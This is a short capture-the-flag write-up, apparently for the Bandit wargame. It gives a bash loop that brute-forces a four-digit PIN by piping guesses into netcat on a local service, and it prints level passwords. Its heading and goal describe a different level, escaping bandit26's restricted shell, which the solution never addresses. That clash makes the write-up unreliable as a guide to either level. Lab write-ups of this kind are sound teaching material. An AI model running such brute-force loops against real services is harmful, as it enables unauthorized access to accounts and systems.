# Level 25 - Level 26 ✔
- **Level Goal:**:<br>
Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.<br>                                            
- **Login SSH:**<br>
User: bandit24<br>
Pass: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ<br>
## Write-up: 📝<br>
In this chall, we learn how to bruteforce. You can reference here: [BruteForce from OWASP](https://owasp.org/www-community/attacks/Brute_force_attack) <br>
### Solution:<br>
- We have no command suggested here. It means we have to write a **bash script** again. With the description above, i just need to pass a string which combines of current 
password and a **PIN** code (which have to bruteforce). So here is my script:<br>
`#! /bin/bash`<br>
`for i in {0000..9999}`<br>
`do`<br>
`    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"`<br>
`done | nc localhost 30002`<br>
**Note**: Remember to put the `| nc localhost 30002` command after looping. Let the loop output **pipeline** through into netcat.  <br>
#### Password for next level: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG 


